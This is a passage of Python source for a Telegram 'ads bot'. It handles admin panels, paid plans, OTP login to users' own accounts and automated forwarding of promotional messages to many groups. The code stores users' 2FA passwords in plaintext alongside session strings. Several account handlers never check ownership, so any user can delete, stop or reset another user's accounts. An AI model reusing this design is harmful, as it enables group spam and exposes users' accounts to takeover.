                text = "<b>ᴀᴅᴍɪɴꜱ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n\n"
                text += "<blockquote><b>Commands:</b>\n"
                text += "<code>/addadmin {user_id}</code>\n"
                text += "<code>/rmadmin {user_id}</code></blockquote>\n\n"
                text += "━━━━━━━━━━━━━━━\n\n"
                text += "<b>ᴀᴅᴍɪɴꜱ ʟɪꜱᴛ</b>\n\n"
                
                # Show owner
                try:
                    owner = await main_bot.get_entity(int(owner_id))
                    owner_username = f"@{owner.username}" if getattr(owner, 'username', None) else "ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ"
                    owner_name = getattr(owner, 'first_name', 'Owner')
                    text += f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{owner_id}</code>\n"
                    text += f"   ɴᴀᴍᴇ: {owner_name}\n"
                    text += f"   ᴜꜱᴇʀɴᴀᴍᴇ: {owner_username}\n\n"
                except Exception:
                    text += f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{owner_id}</code>\n\n"
                
                # Show admins
                if admin_ids:
                    text += f"👥 <b>ᴀᴅᴍɪɴꜱ ({len(admin_ids)}):</b>\n\n"
                    for admin_id in admin_ids:
                        try:
                            admin = await main_bot.get_entity(int(admin_id))
                            admin_username = f"@{admin.username}" if getattr(admin, 'username', None) else "ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ"
                            admin_name = getattr(admin, 'first_name', 'Admin')
                            text += f"   • <code>{admin_id}</code>\n"
                            text += f"      ɴᴀᴍᴇ: {admin_name}\n"
                            text += f"      ᴜꜱᴇʀɴᴀᴍᴇ: {admin_username}\n\n"
                        except Exception:
                            text += f"   • <code>{admin_id}</code>\n\n"
                else:
                    text += "👥 <b>ᴀᴅᴍɪɴꜱ:</b> ɴᴏ ᴀᴅᴍɪɴꜱ ᴀᴅᴅᴇᴅ"
                
                await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back", b"admin_panel")]])
            except Exception as e:
                await event.edit(f"<b>Error:</b> {str(e)}", parse_mode='html', buttons=[[Button.inline("← Back", b"admin_panel")]])
            return
        
        if data == "admin_all_users":
            if not is_admin(uid):
                return

            page = 0
            per_page = 5
            users = list(users_col.find().sort('created_at', -1).skip(page*per_page).limit(per_page))
            total = users_col.count_documents({})
            total_pages = max(1, (total + per_page - 1) // per_page)

            text = f"<b>👥 All Users</b> <code>({total} total, page {page+1}/{total_pages})</code>\n\n"
            user_list = []
            buttons = []
            
            for u in users:
                user_id = u['user_id']
                username = u.get('username')
                
                # Try to fetch username from Telegram if not in database
                if not username:
                    username = await get_username_from_id(event.client, user_id)
                    if username:
                        # Update database with fetched username
                        users_col.update_one({'user_id': user_id}, {'$set': {'username': username}})
                
                # Add to display list
                if username:
                    user_list.append(f"@{username}")
                    label = f"View @{username}"
                else:
                    user_list.append(f"<code>{user_id}</code>")
                    label = f"View {user_id}"
                
                buttons.append([Button.inline(label, f"admin_user_detail_all_{user_id}")])
            
            text += "\n".join(user_list) if users else "<i>No users found.</i>"
            nav = []
            if page > 0:
                nav.append(Button.inline("<", f"admin_all_users_page_{page-1}"))
            if (page+1)*per_page < total:
                nav.append(Button.inline(">", f"admin_all_users_page_{page+1}"))
            if nav:
                buttons.append(nav)

            buttons.append([Button.inline("← Back", b"admin_panel")])
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("admin_all_users_page_"):
            if not is_admin(uid):
                return

            page = int(data.replace("admin_all_users_page_", ""))
            per_page = 5
            users = list(users_col.find().sort('created_at', -1).skip(page*per_page).limit(per_page))
            total = users_col.count_documents({})
            total_pages = max(1, (total + per_page - 1) // per_page)

            text = f"<b>👥 All Users</b> <code>({total} total, page {page+1}/{total_pages})</code>\n\n"
            user_list = []
            buttons = []
            
            for u in users:
                user_id = u['user_id']
                username = u.get('username')
                
                # Try to fetch username from Telegram if not in database
                if not username:
                    username = await get_username_from_id(event.client, user_id)
                    if username:
                        # Update database with fetched username
                        users_col.update_one({'user_id': user_id}, {'$set': {'username': username}})
                
                # Add to display list
                if username:
                    user_list.append(f"@{username}")
                    label = f"View @{username}"
                else:
                    user_list.append(f"<code>{user_id}</code>")
                    label = f"View {user_id}"
                
                buttons.append([Button.inline(label, f"admin_user_detail_all_{user_id}")])
            
            text += "\n".join(user_list) if users else "<i>No users found.</i>"
            nav = []
            if page > 0:
                nav.append(Button.inline("<", f"admin_all_users_page_{page-1}"))
            if (page+1)*per_page < total:
                nav.append(Button.inline(">", f"admin_all_users_page_{page+1}"))
            if nav:
                buttons.append(nav)

            buttons.append([Button.inline("← Back", b"admin_panel")])
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("admin_user_detail_all_"):
            if not is_admin(uid):
                return

            target_id = int(data.replace("admin_user_detail_all_", ""))
            user_detail_source = 'all'

        elif data.startswith("admin_user_detail_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_user_detail_", ""))
            user_detail_source = 'premium'
        
        # Common user detail display logic for both handlers
        if data.startswith("admin_user_detail_all_") or data.startswith("admin_user_detail_"):
            user = users_col.find_one({'user_id': target_id})
            
            if not user:
                await event.answer("User not found!", alert=True)
                return
            
            tier = user.get('tier', 'free')
            max_acc = user.get('max_accounts', 1)
            approved = user.get('approved', False)
            accounts = list(accounts_col.find({'owner_id': target_id}))
            active = sum(1 for a in accounts if a.get('is_forwarding'))
            
            created_at = user.get('created_at')
            created_str = created_at.strftime('%Y-%m-%d %H:%M') if hasattr(created_at, 'strftime') else str(created_at)
            
            # Show plan name and expiry instead of tier
            # Check if target user is admin
            is_target_admin = is_admin(target_id)
            
            if is_target_admin:
                plan_display = "⚡ God Mode"
                expiry_display = "∞"
                max_acc = 999  # Admins have unlimited accounts
            elif tier == 'premium':
                plan_name = user.get('plan_name', 'Premium')
                expires_at = user.get('premium_expires_at')
                if expires_at and isinstance(expires_at, datetime):
                    remaining = expires_at - datetime.now()
                    if remaining.total_seconds() > 0:
                        expiry_display = f"{remaining.days}d"
                    else:
                        expiry_display = "Expired"
                else:
                    expiry_display = "∞"
                plan_display = plan_name
            else:
                plan_display = "Scout: Free"
                expiry_display = "∞"
            
            text = (
                "<b>👤 User Profile</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>📋 User Information:</b>\n"
                f"├ <b>User ID:</b> <code>{target_id}</code>\n"
                f"├ <b>Plan:</b> <code>{plan_display}</code>\n"
                f"├ <b>Expiry:</b> <code>{expiry_display}</code>\n"
                f"└ <b>Approved:</b> {'✅ Yes' if approved else '❌ No'}\n\n"
                "<b>📱 Account Statistics:</b>\n"
                f"├ <b>Max Accounts:</b> <code>{max_acc}</code>\n"
                f"├ <b>Total Accounts:</b> <code>{len(accounts)}</code>\n"
                f"└ <b>▶️ Active Now:</b> <code>{active}</code>\n\n"
                "<b>⏰ Account Activity:</b>\n"
                f"└ <b>Joined:</b> <code>{created_str}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            buttons = []
            
            # Don't show Grant/Revoke Premium buttons for admins
            if not is_target_admin:
                if tier != 'premium':
                    buttons.append([Button.inline("✅ Grant Premium", f"admin_grant_premium_{target_id}")])
                else:
                    buttons.append([Button.inline("❌ Revoke Premium", f"admin_revoke_premium_{target_id}")])
                
                # Add Reset button for non-admin users
                buttons.append([Button.inline("\U0001F504 Reset User", f"admin_reset_user_{target_id}")])
            
            # Back button routing based on source list
            if user_detail_source == 'all':
                back_callback = b"admin_all_users"
            else:
                back_callback = b"admin_premium"
            buttons.append([Button.inline("← Back", back_callback)])
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("admin_grant_premium_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_grant_premium_", ""))
            
            # Show plan selection screen
            text = (
                f"<b>🎯 Select Plan for User {target_id}</b>\n\n"
                f"<i>Choose a plan to grant (30 days):</i>\n\n"
                f"<b>🔰 Scout:</b> Free Plan (1 account)\n"
                f"<b>📈 Grow:</b> 3 accounts, medium speed\n"
                f"<b>⭐ Prime:</b> 7 accounts, fast speed\n"
                f"<b>👑 Dominion:</b> 15 accounts, fastest speed"
            )
            
            buttons = [
                [Button.inline("🔰 Scout", f"admin_grant_scout_{target_id}")],
                [Button.inline("📈 Grow", f"admin_grant_grow_{target_id}")],
                [Button.inline("⭐ Prime", f"admin_grant_prime_{target_id}")],
                [Button.inline("👑 Dominion", f"admin_grant_dominion_{target_id}")],
                [Button.inline("← Back", f"admin_user_detail_{target_id}")]
            ]
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        # Handle individual plan grants
        if data.startswith("admin_grant_scout_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_grant_scout_", ""))
            plan = PLANS['scout']
            days = 30
            expires_at = datetime.now() + timedelta(days=days)
            
            users_col.update_one(
                {'user_id': target_id},
                {'$set': {
                    'tier': 'free',
                    'plan_name': plan['name'],
                    'max_accounts': plan['max_accounts'],
                    'approved': True
                }},
                upsert=True
            )
            
            # Send notification to user
            welcome_image = MESSAGES.get('welcome_image', '')
            notify_text = (
                "<b>🎉 Plan Activated!</b>\n\n"
                "<b>Plan:</b> Scout\n"
                "<b>Accounts:</b> 1\n"
                "<b>Validity:</b> 30 days\n\n"
                "<i>Your plan features are now active!</i>"
            )
            notify_buttons = [
                [Button.inline("Check Plans", b"back_plans"), Button.inline("GO ADS BOT Ads Now!", b"enter_dashboard")]
            ]
            
            try:
                if welcome_image:
                    await main_bot.send_file(target_id, welcome_image, caption=notify_text, parse_mode='html', buttons=notify_buttons)
                else:
                    await main_bot.send_message(target_id, notify_text, parse_mode='html', buttons=notify_buttons)
            except Exception:
                pass
            
            await event.answer("✅ Scout plan granted!", alert=True)
            await event.edit(
                f"<b>✅ Plan Granted</b>\n\n<i>User {target_id} now has Scout plan access.</i>",
                parse_mode='html',
                buttons=[[Button.inline("← Back to Users", b"admin_all_users")]]
            )
            return
        
        if data.startswith("admin_grant_grow_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_grant_grow_", ""))
            days = 30
            
            try:
                # Use centralized function - handles DB, user notification, AND channel notification
                await grant_premium_to_user(target_id, 'grow', days, source='admin_user_profile')
                
                await event.answer("✅ Grow plan granted!", alert=True)
                await event.edit(
                    f"<b>✅ Plan Granted</b>\n\n<i>User {target_id} now has Grow plan access (30 days).</i>",
                    parse_mode='html',
                    buttons=[[Button.inline("← Back to Users", b"admin_all_users")]]
                )
            except Exception as e:
                await event.answer(f"❌ Error: {str(e)[:50]}", alert=True)
                print(f"[ADMIN] Failed to grant Grow to {target_id}: {e}")
            return
        
        if data.startswith("admin_grant_prime_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_grant_prime_", ""))
            days = 30
            
            try:
                # Use centralized function - handles DB, user notification, AND channel notification
                await grant_premium_to_user(target_id, 'prime', days, source='admin_user_profile')
                
                await event.answer("✅ Prime plan granted!", alert=True)
                await event.edit(
                    f"<b>✅ Plan Granted</b>\n\n<i>User {target_id} now has Prime plan access (30 days).</i>",
                    parse_mode='html',
                    buttons=[[Button.inline("← Back to Users", b"admin_all_users")]]
                )
            except Exception as e:
                await event.answer(f"❌ Error: {str(e)[:50]}", alert=True)
                print(f"[ADMIN] Failed to grant Prime to {target_id}: {e}")
            return
        
        if data.startswith("admin_grant_dominion_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_grant_dominion_", ""))
            days = 30
            
            try:
                # Use centralized function - handles DB, user notification, AND channel notification
                await grant_premium_to_user(target_id, 'dominion', days, source='admin_user_profile')
                
                await event.answer("✅ Dominion plan granted!", alert=True)
                await event.edit(
                    f"<b>✅ Plan Granted</b>\n\n<i>User {target_id} now has Dominion plan access (30 days).</i>",
                    parse_mode='html',
                    buttons=[[Button.inline("← Back to Users", b"admin_all_users")]]
                )
            except Exception as e:
                await event.answer(f"❌ Error: {str(e)[:50]}", alert=True)
                print(f"[ADMIN] Failed to grant Dominion to {target_id}: {e}")
            return
        
        if data.startswith("admin_revoke_premium_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.replace("admin_revoke_premium_", ""))
            users_col.update_one(
                {'user_id': target_id},
                {'$set': {'tier': 'free', 'max_accounts': 1}}
            )
            await event.answer("❌ Premium revoked!", alert=True)
            
            await event.edit(
                f"<b>❌ Premium Revoked</b>\n\n<i>User {target_id} now has free tier.</i>",
                parse_mode='html',
                buttons=[[Button.inline("← Back to Premium Users", b"admin_premium")]]
            )
            return
        
        if data == "admin_premium":
            if not is_admin(uid):
                return
            
            users = get_premium_users()
            text = f"<b>\U0001F451 Premium Users</b> <code>({len(users) if users else 0} total)</code>\n\n"
            
            buttons = []
            if not users:
                text += "<i>No premium users yet.</i>"
            else:
                for u in users[:20]:
                    user_id = u.get('user_id')
                    max_acc = u.get('max_accounts', 5)
                    acc_count = accounts_col.count_documents({'owner_id': user_id})
                    username = u.get('username')
                    label_id = f"@{username}" if username else str(user_id)
                    label = f"\U0001F451 {label_id} ({acc_count}/{max_acc} acc)"
                    buttons.append([Button.inline(label, f"admin_user_detail_{user_id}")])
            
            buttons.append([Button.inline("← Back", b"admin_panel")])
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "admin_stats":
            if not is_admin(uid):
                return
            
            total_sent = 0
            total_failed = 0
            total_auto_replies = 0
            for stat in account_stats_col.find({}):
                total_sent += stat.get('total_sent', 0)
                total_failed += stat.get('total_failed', 0)
                total_auto_replies += stat.get('auto_replies', 0)
            
            text = f"**Bot Statistics**\n\n"
            text += f"Total Messages Sent: {total_sent}\n"
            text += f"Total Failed: {total_failed}\n"
            text += f"Success Rate: {(total_sent / max(1, total_sent + total_failed) * 100):.1f}%\n"
            text += f"Total Auto Replies: {total_auto_replies}"
            
            await event.edit(text, buttons=[[Button.inline("Back", b"admin_panel")]])
            return
        
        if data == "admin_broadcast":
            if not is_admin(uid):
                return
            
            user_states[uid] = {'action': 'broadcast'}
            await event.respond("Send the message to broadcast to all users:")
            return
        
        if data.startswith("page_"):
            page = int(data.split("_")[1])
            accounts = get_user_accounts(uid)
            max_acc = get_user_max_accounts(uid)
            tier_settings = get_user_tier_settings(uid)
            tier = "Premium" if is_premium(uid) else "Free"
            
            text = f"**{tier} Dashboard** (Page {page+1})\n\nAccounts: {len(accounts)}/{max_acc}"
            await event.edit(text, buttons=account_list_keyboard(uid, page))
            return
        
        if data.startswith("acc_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            if not acc:
                await event.answer("Not found!", alert=True)
                return
            
            # Check if user has per-account config access (Prime/Dominion)
            if not has_per_account_config_access(uid):
                await event.answer("Per-account config is a Prime/Dominion feature!", alert=True)
                await event.edit(
                    "🔒 **Per-Account Configuration**\n\n"
                    "This feature allows you to customize settings for each account individually.\n\n"
                    "Available in:\n"
                    "• Prime Plan (₹199)\n"
                    "• Dominion Plan (₹389)\n\n"
                    "Use main dashboard settings to control all accounts together.",
                    buttons=[[Button.inline("⬆️ Upgrade Plan", b"go_premium")], [Button.inline("🏠 Dashboard", b"enter_dashboard")]]
                )
                return
            
            stats = get_account_stats(account_id)
            settings = get_account_settings(account_id)
            topics = account_topics_col.count_documents({'account_id': account_id})
            groups = account_auto_groups_col.count_documents({'account_id': account_id})
            
            status = "🟢 Running" if acc.get('is_forwarding') else "🔴 Stopped"
            
            # Get user-level intervals
            user_doc = get_user(uid)
            preset = user_doc.get('interval_preset', 'medium')
            if preset == 'custom':
                custom = user_doc.get('custom_interval', {})
                msg_d = custom.get('msg_delay', 30)
                round_d = custom.get('round_delay', 600)
            else:
                interval_data = INTERVAL_PRESETS.get(preset, INTERVAL_PRESETS['medium'])
                msg_d = interval_data['msg_delay']
                round_d = interval_data['round_delay']
            
            text = (
                "<b>📱 Account Details</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>📋 Account Info:</b>\n"
                f"├ <b>Phone:</b> <code>{acc['phone']}</code>\n"
                f"├ <b>Name:</b> <code>{acc.get('name', 'Unknown')}</code>\n"
                f"└ <b>Status:</b> {status}\n\n"
                "<b>📊 Statistics:</b>\n"
                f"├ <b>Topics:</b> <code>{topics}</code>\n"
                f"├ <b>Groups:</b> <code>{groups}</code>\n"
                f"├ <b>✅ Messages Sent:</b> <code>{stats.get('total_sent', 0)}</code>\n"
                f"└ <b>❌ Failed:</b> <code>{stats.get('total_failed', 0)}</code>\n\n"
                "<b>⏱️ Interval Settings:</b>\n"
                f"├ <b>⏰ Message Delay:</b> <code>{msg_d}s</code>\n"
                f"└ <b>🔄 Round Delay:</b> <code>{round_d}s</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            await event.edit(text, parse_mode='html', buttons=account_menu_keyboard(account_id, acc, uid))
            return
        
        if data.startswith("topics_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            await event.edit(
                f"<b> Topics</b>\n<blockquote>Account: <code>{_h(acc['phone'])}</code></blockquote>",
                parse_mode='html',
                buttons=topics_menu_keyboard(account_id, uid)
            )
            return
        
        if data.startswith("topic_"):
            parts = data.split("_")
            account_id, topic = parts[1], parts[2]
            
            tier_settings = get_user_tier_settings(uid)
            max_groups = tier_settings.get('max_groups_per_topic', 10)
            
            links = list(account_topics_col.find({'account_id': {'$in': _account_id_variants(account_id)}, 'topic': topic}))
            text = f"**{topic.capitalize()}** ({len(links)}/{max_groups} links)\n\n"
            
            for i, l in enumerate(links[:15], 1):
                text += f"{i}. {l['url']}\n"
            if len(links) > 15:
                text += f"...+{len(links)-15} more"
            
            if not links:
                text += "No links yet."
            
            await event.edit(text, buttons=[
                [Button.inline("Add", f"add_{account_id}_{topic}"), Button.inline("Clear", f"clear_{account_id}_{topic}")],
                [Button.inline("Back", f"topics_{account_id}")]
            ])
            return
        
        if data.startswith("auto_"):
            account_id = data.split("_")[1]
            groups = list(account_auto_groups_col.find({'account_id': {'$in': _account_id_variants(account_id)}}))
            
            text = f"**Auto Groups** ({len(groups)})\n\n"
            for i, g in enumerate(groups[:15], 1):
                u = f"@{g['username']}" if g.get('username') else "Private"
                text += f"{i}. {g['title'][:20]} ({u})\n"
            if len(groups) > 15:
                text += f"...+{len(groups)-15} more"
            
            await event.edit(text, buttons=[[Button.inline("Back", f"topics_{account_id}")]])
            return
        
        if data.startswith("add_"):
            parts = data.split("_")
            account_id, topic = parts[1], parts[2]
            user_states[uid] = {'action': 'add_links', 'account_id': account_id, 'topic': topic}
            await event.respond(f"Send links for **{topic}** (one per line):")
            return
        
        if data.startswith("clear_"):
            parts = data.split("_")
            account_id, topic = parts[1], parts[2]
            result = account_topics_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}, 'topic': topic})
            await event.answer(f"Deleted {result.deleted_count} links!")
            return
        
        if data.startswith("settings_"):
            account_id = data.split("_")[1]
            settings = get_account_settings(account_id)
            
            # Get user-level intervals
            user_doc = get_user(uid)
            preset = user_doc.get('interval_preset', 'medium')
            if preset == 'custom':
                custom = user_doc.get('custom_interval', {})
                msg_d = custom.get('msg_delay', 30)
                round_d = custom.get('round_delay', 600)
            else:
                interval_data = INTERVAL_PRESETS.get(preset, INTERVAL_PRESETS['medium'])
                msg_d = interval_data['msg_delay']
                round_d = interval_data['round_delay']
            
            text = "**Settings**\n\n"
            text += f"ᴍᴇꜱꜱᴀɢᴇ ᴅᴇʟᴀʏ: {msg_d}ꜱ\n"
            text += f"ʀᴏᴜɴᴅ ᴅᴇʟᴀʏ: {round_d}ꜱ\n"
            
            tier_settings = get_user_tier_settings(uid)
            if tier_settings.get('auto_reply_enabled'):
                auto_reply_text = settings.get('auto_reply', 'ᴅᴇꜰᴀᴜʟᴛ')
                if auto_reply_text and auto_reply_text != 'ᴅᴇꜰᴀᴜʟᴛ':
                    text += f"ᴀᴜᴛᴏ-ʀᴇᴘʟʏ: {auto_reply_text[:40]}...\n"
                else:
                    text += f"ᴀᴜᴛᴏ-ʀᴇᴘʟʏ: ᴅᴇꜰᴀᴜʟᴛ...\n"
            
            failed = account_failed_groups_col.count_documents({'account_id': account_id})
            text += f"ꜰᴀɪʟᴇᴅ ɢʀᴏᴜᴘꜱ: {failed}"
            
            await event.edit(text, parse_mode='markdown', buttons=settings_keyboard(account_id, uid))
            return
        # setmsg_ and setround_ removed: intervals are now user-level only (Settings -> Intervals)
        
        if data.startswith("setreply_"):
            tier_settings = get_user_tier_settings(uid)
            if not tier_settings.get('auto_reply_enabled'):
                await event.answer("Premium feature!", alert=True)
                return
            account_id = data.split("_")[1]
            user_states[uid] = {'action': 'set_reply', 'account_id': account_id}
            await event.respond("Send new auto-reply message:")
            return
        
        if data.startswith("clearfailed_"):
            account_id = data.split("_")[1]
            clear_failed_groups(account_id)
            await event.answer("Cleared failed groups!")
            return
        
        if data.startswith("stats_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            stats = get_account_stats(account_id)
            failed = account_failed_groups_col.count_documents({'account_id': account_id})
            
            last = stats.get('last_forward')
            last_time = last.strftime('%Y-%m-%d %H:%M') if last else 'Never'
            
            total_sent = stats.get('total_sent', 0)
            total_failed = stats.get('total_failed', 0)
            total_attempts = total_sent + total_failed
            success_rate = (total_sent / total_attempts * 100) if total_attempts > 0 else 0
            
            text = (
                f"<b>📊 Account Statistics</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                f"<b>📱 Account:</b> <code>{acc['phone']}</code>\n\n"
                "<b>📈 Message Statistics:</b>\n"
                f"├ <b>✅ Messages Sent:</b> <code>{total_sent}</code>\n"
                f"├ <b>❌ Messages Failed:</b> <code>{total_failed}</code>\n"
                f"├ <b>⏭️ Skipped Groups:</b> <code>{failed}</code>\n"
                f"└ <b>📊 Success Rate:</b> <code>{success_rate:.1f}%</code>\n\n"
                "<b>⏰ Last Activity:</b>\n"
                f"└ <b>Last Forward:</b> <code>{last_time}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            await event.edit(text, parse_mode='html', buttons=[
                [Button.inline("🔄 Reset Stats", f"reset_{account_id}")],
                [Button.inline("← Back", f"acc_{account_id}")]
            ])
            return
        
        if data.startswith("reset_"):
            account_id = data.split("_")[1]
            account_stats_col.update_one(
                {'account_id': account_id},
                {'$set': {'total_sent': 0, 'total_failed': 0}},
                upsert=True
            )
            await event.answer("Stats reset!")
            return
        
        if data.startswith("refresh_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            
            await event.answer("Refreshing groups...", alert=False)
            
            try:
                session = cipher_suite.decrypt(acc['session'].encode()).decode()
                client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
                await client.connect()
                
                if await client.is_user_authorized():
                    count = await fetch_groups(client, account_id, acc['phone'])
                    await send_log(account_id, f"<b>Groups refreshed:</b> <code>{count}</code>")
                    await client.disconnect()
                    await event.answer(f"Found {count} groups!", alert=True)
                    await event.edit(f"<b>Refresh Groups</b>\n\n<b>Found:</b> <code>{count}</code>", parse_mode='html', buttons=[[Button.inline("Back", f"acc_{account_id}")]])
                else:
                    await event.answer("Session expired!", alert=True)
            except Exception as e:
                await event.answer("Error!", alert=True)
            return
        
        if data.startswith("fwd_select_"):
            account_id = data.split("_")[2]
            await event.edit("**Start Forwarding**\n\nSelect where to forward:", buttons=forwarding_select_keyboard(account_id, uid))
            return
        
        if data.startswith("startfwd_"):
            parts = data.split("_")
            account_id = parts[1]
            topic = parts[2] if len(parts) > 2 else "all"
            
            acc = get_account_by_id(account_id)
            accounts_col.update_one({'_id': acc['_id']}, {'$set': {'is_forwarding': True, 'fwd_topic': topic}})
            
            if account_id not in forwarding_tasks:
                forwarding_tasks[account_id] = asyncio.create_task(forwarder_loop(account_id, topic, uid))
            
            await event.answer("Started!")
            await event.edit(f"Forwarding started!\n\nTopic: {topic}", buttons=[[Button.inline("Back", f"acc_{account_id}")]])
            return
        
        if data.startswith("stop_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            
            accounts_col.update_one({'_id': acc['_id']}, {'$set': {'is_forwarding': False}})
            
            if account_id in forwarding_tasks:
                forwarding_tasks[account_id].cancel()
                del forwarding_tasks[account_id]
            
            if account_id in auto_reply_clients:
                try:
                    await auto_reply_clients[account_id].disconnect()
                except:
                    pass
                del auto_reply_clients[account_id]
            
            # Send log message to user (not per account)
            try:
                user_doc = get_user(uid)
                logs_chat_id = user_doc.get('logs_chat_id')
                if logs_chat_id and CONFIG.get('logger_bot_token'):
                    log_msg = (
                        f"<b>⏹️ Ads Stopped</b>\n\n"
                        f"<b>Account:</b> <code>{acc.get('phone', 'Unknown')}</code>\n\n"
                        f"<i>Advertising has been stopped by user.</i>"
                    )
                    await logger_bot.send_message(int(logs_chat_id), log_msg, parse_mode='html')
                    print(f"[STOP] Stop log sent to user {uid} for account {account_id}")
            except Exception as e:
                print(f"[LOG ERROR] Failed to send stop log to user {uid}: {e}")
            
            await event.answer("Stopped!")
            await event.edit("Forwarding stopped!", buttons=[[Button.inline("Back", f"acc_{account_id}")]])
            return
        
        # (Removed legacy per-account log toggles; logs are user-level via menu_logs)
        
        if data.startswith("delete_"):
            account_id = data.split("_")[1]
            await event.edit(
                "**Delete this account?**\n\nAll data will be removed!",
                buttons=[
                    [Button.inline("Yes", f"confirm_{account_id}"), Button.inline("No", f"acc_{account_id}")]
                ]
            )
            return
        
        if data.startswith("confirm_"):
            account_id = data.split("_")[1]
            acc = get_account_by_id(account_id)
            
            if acc:
                from bson.objectid import ObjectId
                accounts_col.delete_one({'_id': ObjectId(account_id)})
                account_topics_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                account_settings_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                account_stats_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                account_auto_groups_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                account_failed_groups_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                logger_tokens_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}})
                
                if account_id in forwarding_tasks:
                    forwarding_tasks[account_id].cancel()
                    del forwarding_tasks[account_id]
                
                if account_id in auto_reply_clients:
                    try:
                        await auto_reply_clients[account_id].disconnect()
                    except:
                        pass
                    del auto_reply_clients[account_id]
            
            await event.answer("Deleted!")
            await event.edit("**Dashboard**", buttons=account_list_keyboard(uid))
            return
        
        if data == "host":
            if not is_approved(uid):
                approve_user(uid)
            
            accounts = get_user_accounts(uid)
            max_accounts = get_user_max_accounts(uid)
            
            if len(accounts) >= max_accounts:
                if is_premium(uid):
                    await event.answer(f"Limit reached ({max_accounts})", alert=True)
                else:
                    await event.answer("Upgrade to Premium for more accounts!", alert=True)
                return
            
            user_states[uid] = {'action': 'phone'}
            await event.respond("Send phone with country code:\n\nExample: `+919876543210`")
            return
        
        if data.startswith("otp_"):
            if uid not in user_states or user_states[uid].get('action') != 'otp':
                return
            
            digit = data.split("_")[1]
            otp = user_states[uid].get('otp', '')
            
            if digit == "cancel":
                if 'client' in user_states[uid]:
                    await user_states[uid]['client'].disconnect()
                del user_states[uid]
                await event.answer("Cancelled!")
                await event.delete()
                return
            elif digit == "back":
                otp = otp[:-1]
            else:
                otp += digit
            
            user_states[uid]['otp'] = otp
            
            if len(otp) == 5:
                await event.edit(f"Code: `{otp}`\n\nVerifying...")
                
                client = None
                try:
                    client = user_states.get(uid, {}).get('client')
                    if not client:
                        raise RuntimeError('Session expired. Please request OTP again.')
                    
                    await client.sign_in(user_states[uid]['phone'], otp, phone_code_hash=user_states[uid]['hash'])
                    
                    me = await client.get_me()
                    session = client.session.save()
                    encrypted = cipher_suite.encrypt(session.encode()).decode()
                    
                    result = accounts_col.insert_one({
                        'owner_id': uid,
                        'phone': user_states[uid]['phone'],
                        'name': me.first_name or 'Unknown',
                        'session': encrypted,
                        'is_forwarding': False,
                        'two_fa_password': user_states[uid].get('two_fa_password', ''),
                        'added_at': datetime.now()
                    })
                    
                    account_id = str(result.inserted_id)
                    count = await fetch_groups(client, account_id, user_states[uid]['phone'])
                    
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    
                    # Capture phone before clearing state
                    account_phone = user_states.get(uid, {}).get('phone', '')

                    if uid in user_states:
                        del user_states[uid]
                    
                    print(f"[ACCOUNT] Added account for user {uid}, fetched {count} groups")

                    # Send account added notification to channel
                    try:
                        user = get_user(uid)
                        sender = await event.get_sender()
                        total_accounts = accounts_col.count_documents({'owner_id': uid})
                        plan_name = user.get('plan', 'scout').capitalize()
                        max_accounts = get_user_max_accounts(uid)

                        print(f"[ACCOUNT] Triggering notification for user {uid}, phone {account_phone}")
                        task = asyncio.create_task(notify_account_added(
                            uid, sender.username, getattr(sender, 'phone', None),
                            account_phone, plan_name, total_accounts, max_accounts
                        ))
                        task.add_done_callback(lambda t: print(f"[ACCOUNT] Notification task completed: {t.exception() if t.exception() else 'Success'}"))
                    except Exception as e:
                        print(f"[NOTIFICATION] Error creating notification task (OTP callback flow): {e}")

                    await event.edit(
                        f"**Account Added!**\n\n{me.first_name}\nFound {count} groups",
                        buttons=account_list_keyboard(uid)
                    )
                    
                except SessionPasswordNeededError:
                    user_states[uid]['action'] = '2fa'
                    await event.edit("**2FA Required**\n\nSend your cloud password:")
                except PhoneCodeInvalidError:
                    user_states[uid]['otp'] = ''
                    await event.edit("Wrong code! Try again:", buttons=otp_keyboard())
                except Exception as e:
                    await event.edit(f"Error: {str(e)[:100]}")
                    try:
                        if client:
                            await client.disconnect()
                    except Exception:
                        pass
                    if uid in user_states:
                        del user_states[uid]
            else:
